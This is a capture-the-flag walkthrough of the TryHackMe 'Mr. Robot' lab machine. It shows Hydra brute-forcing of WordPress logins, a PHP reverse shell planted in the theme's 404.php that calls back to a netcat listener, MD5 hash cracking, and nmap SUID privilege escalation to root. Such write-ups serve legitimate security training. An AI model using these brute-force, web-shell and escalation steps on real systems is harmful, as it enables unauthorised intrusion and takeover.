---
published: true
title: Mr. Robot - TryHackMe Walkthrough
category: Writeup
author: F3dai
image: 'https://imgur.com/OJwI5my.png'
---
"Can you root this Mr. Robot styled machine? This is a virtual machine meant for beginners/intermediate users. There are 3 hidden keys located on the machine, can you find them? Credit to Leon Johnson for creating this machine." 

This is a TryHackMe box. To access this you must sign up to [https://tryhackme.com/](https://tryhackme.com/).

**URL:** [Mr. Robot](https://www.tryhackme.com/room/mrrobot)

**Difficulty:** Medium

**Author:** Ben

## Enumeration

We are given the IP 10.10.235.143. Run an nmap scan with the following command:

<pre>PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
443/tcp open   ssl/http Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03</pre>

Very common ports when doing CTF - we have ssh, and HTTP (running HTTPS).

Let's start enumerating by exploring port 80 on my browser:

![port 80](https://imgur.com/o9aLJv7.png)

The fancy web terminal gives a few options which are all references to the TV show Mr. Robot.

Let's do a dirb scan to find more paths in the web directory:

<pre>dirb http://10.10.235.143/</pre>

![dirb](https://imgur.com/MjJczis.png)

I stopped the scan early because it was taking a long time. I visited /login and it gave me a **Wordpress login page**.

![Wp login](https://imgur.com/43HhZUa.png)

The website is evidently running Wordpress which we know is prone to a lot of attacks. 

Let’s run a Wordpress scan with WPScan. Please note, the newer version requires an API key you can get for free on their website.

Here are some of the important results from the scan:

The website is running **WordPress version 4.3.1**. 

Unfortunately, no users have been found:

![users](https://imgur.com/xubbV5D.png)

It is using the theme "**twentyfifteen**":

![theme](https://imgur.com/o2jBMvZ.png)

There were **81 vulnerabilities** found with the Wordpress version:

![WP vulns](https://imgur.com/tpTddTl.png)

There is a robots.txt file:

![robots wp](https://imgur.com/FDiJ6xI.png)

This was also found in the dirb scan, let's check it out:

![robots](https://imgur.com/KW39Lsi.png)

<pre>User-agent: *
fsocity.dic
key-1-of-3.txt</pre>

Let's check these paths out:

**fsocity.dic**:

I downloaded this file onto my local machine. 

<pre>head fsocity.dic
wc -l fsocity.dic</pre>

![head and wc](https://imgur.com/K3JYzrL.png)

This file contains 858160 lines of text, it looks like a wordlist for something. This may come into use later.

**key-1-of-3.txt**:

![key 1](https://imgur.com/AF6X5mm.png)

This is the first key for the challenge.

There wasn't much else to find. Wordpress boxes usually entail brute-forcing but I have no usernames. We were given that dictionary from earlier so maybe the username is in there.

This is what happens when the wrong username is entered on Wordpress:

![wrong user](https://i.imgur.com/Dbd02Hc.png)

The failed message indicates the username is unknown, so we can use a tool like hydra to spot a different failure message to find the correct username.

<pre>ERROR: Invalid username. Lost your password?</pre>

The dictionary from earlier seems to have a lot of duplicates so let’s filter these out. We’ll use sort to do this.

<pre>sort fsocity.dic | uniq > new.dic 
wc -l new.dic</pre>

![sort](https://imgur.com/22DTuzR.png)

The file was reduced to 11451 lines.

Let’s set up in order to brute-force the login.

You can find more information about this type of attack on these articles:

[Password Cracking - CyberGoat](/ethical/PasswordCracking/)

[Brute Forcing - CyberGoat](/ethical/Brute-Forcing-DVWA/)

1 - Get the HTTP request:

![request](https://i.imgur.com/9VCjuY0.png)

2 - Open up Burp Suite, the intercept should be on.

![burp](https://i.imgur.com/1aMHugh.png)

3 - Enter a random username and password on the website login page, Burp Suite should capture the request. Send this to the intruder and clear variables (right-click > sent to int > clear §)

![vars](https://i.imgur.com/0nM3gPT.png)

4 - Take note of this request. You can turn off the proxy and intercept now.

Now we can use hydra to test out a bunch of usernames against the login. This is the hydra command:

<pre>hydra -vV -L new.dic -p somepassword 10.10.235.143 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username'</pre>

Here is a breakdown of the command above:

-vV verbose, -L dictionary, -p irrelevant password, host, brute with post form, ‘login page : POST parameters to send USER PASS are the variables : F= failed message’

Execute this command. After a few minutes I get the following result:

![user brute result](https://i.imgur.com/fAYDlvN.png)

We have identified “**elliot**” as a username.

Now let’s attempt a password with this username but a different failed attempt message. This is the web page response when I enter the correct username and an incorrect password.

![pass incorrect](https://i.imgur.com/zihVd0N.png)

We have the following failed attempt message:

<pre>ERROR: The password you entered for the username Elliot is incorrect</pre>

Now let’s do the same method of bruting for the password. This is the new hydra command:

<pre>hydra -vV -P new.dic -l elliot 192.168.56.119 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=The password'</pre>

Notice how we are now using our username with -l elliot, and the dictionary for our password now with -P new.dic. We have also changed the failed message, I just shortened it to “The password”.

Running this command gives the following result:

![pass](https://imgur.com/aMiScMZ.png)

<pre>login: elliot password: E*******2</pre>

Great. We have some credentials, so we now have authenticated access. We can now exploit this, aiming for some kind of reverse shell.

A pretty straight forward method of getting a reverse shell with Wordpress is by uploading a php reverse shell file. I learnt this with another Wordpress machine I recently completed.

You can read more about reverse shells here:

[Reverse Shells - CyberGoat](https://www.cybergoat.co.uk/cheatsheet/Reverse_Payload_Cheatsheet/)

If you’re working from a Kali Linux machine, there are some pre-made web shells in the following directory:

<pre>/usr/share/webshells</pre>

Use the following command to copy a php reverse shell to your current directory:

<pre>cp /usr/share/webshells/php/php-reverse-shell.php .</pre>

Edit the file and add your local TryHackMe IP and port 4444.

<pre>nano php-reverse-shell.php</pre>

![php rev shell](https://imgur.com/JqoNC48.png)

I tried uploading the php file to the website however Wordpress blocks any attempt to upload php files. Another method is to upload the code to an already existing php file.

Go to the editor section on Wordpress and edit the 404.php code.

![editor](https://imgur.com/mTKUjwC.png)

Now the payload is ready, set up a netcat listener to listen on your specified port.

<pre>netcat -nvlp 4444</pre>

Now that everything is set up, visit the modified 404.php page.

<pre>http://10.10.235.143/404.php</pre>

We got the reverse shell, signed in as "daemon".

![rev shell](https://imgur.com/tSCdkFA.png)

I went to visit the **/home** directory to see who is on the system. There is a user called **robot** with a couple of files. I was unable to see the contents of the key file but I was able to see what was inside “password.raw-md5”.

<pre>cd /home/robot
ls
cat key-2-of-3.txt
cat password.raw-md5</pre>

![key 2](https://imgur.com/aOsBBnw.png)

<pre>robot:c3****************************3b</pre>

This looks like a hash value, a quick google search reveals the password:

![hash](https://imgur.com/uRbQ2qY.png)

Let’s try and change the user to robot with this password that we found in his home directory. Make sure the shell is upgraded to fully interactive TTY, otherwise the command will not work.

<pre>python -c 'import pty; pty.spawn("/bin/bash")'
su robot</pre>

![su](https://imgur.com/GmGjIma.png)

We have successfully logged in a Robot, and we can also view the second key in Robot's home directory: 

<pre>key-2-of-3.txt</pre>

## Privilege Escalation

Now that we have a lower privileged user, we are aiming to escalate this for sudo rights in order to have complete ownership of the system.

Let’s firstly check for SUID. SUID is essentially a way to run a command as another user using any services running on the unix-like operating system. We can use these to elevate our current rights on the system.

This following command checks for all the SUID binaries on the system:

<pre>find / -user root -perm -4000 -print 2>/dev/null</pre>

![suid](https://i.imgur.com/hwh5sCA.png)

If you are interested in another machine where SUID exploitation is needed, look at my other writeup on ByteSec - a Vulnhub machine.

[Byte Sec CTF - CyberGoat](https://www.cybergoat.co.uk/writeup/ByteSec/)

When analysing these binaries, it’s good to have a list of native binaries. Here is a list:

<pre>ping
ping6
passwd
sudo
chfn
apring
gpasswd
chsh
chfn
mount
sudo
su
umount
mount
newgrp
pppd</pre>

We can identify NMAP as a non-native SUID. We need to investigate this further. I researched how to exploit NMAP SUID binary. This is the website I used:

[Pentest Lab](https://pentestlab.blog/2017/09/25/suid-executables/)

Firstly, let’s get an interactive NMAP shell with the following command:

<pre>nmap --interactive</pre>

And now we can run the next command for elevated privileges:

<pre>!sh</pre>

![sh](https://i.imgur.com/DZ7IBRi.png)

And we have root! Nice and simple SUID exploitation for elevating rights. The last flag will be in /root:

![root](https://imgur.com/cnUTcPr.png)





